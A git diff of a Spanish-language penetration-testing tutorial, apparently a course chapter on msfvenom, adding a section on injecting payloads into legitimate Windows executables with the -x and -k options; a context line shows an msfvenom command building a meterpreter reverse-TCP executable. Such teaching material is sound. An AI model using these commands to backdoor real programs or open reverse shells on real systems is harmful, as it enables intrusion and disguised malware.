@@ -143,4 +143,9 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe LHOST=192.168.1.45 LPORT=
 
 ## 4.3. Inyección de payloads en ejecutables Windows
 
+La inyección de payloads en ejecutables de Windows es una técnica en la que se modifica o amplía un binario existente para introducir código adicional que se ejecuta junto al programa original. Para este proposito, contamos con las opciones:
+
+- **-x ejecutable.exe:** programa legítimo en el que pretendemos inyectar el payload.
+- **-k:** trata de mantener la funcionalidad original aunque no siempre funciona.
+
 [⟵ Anterior](03_shells.md) | [Siguiente ⟶](05_windows.md)
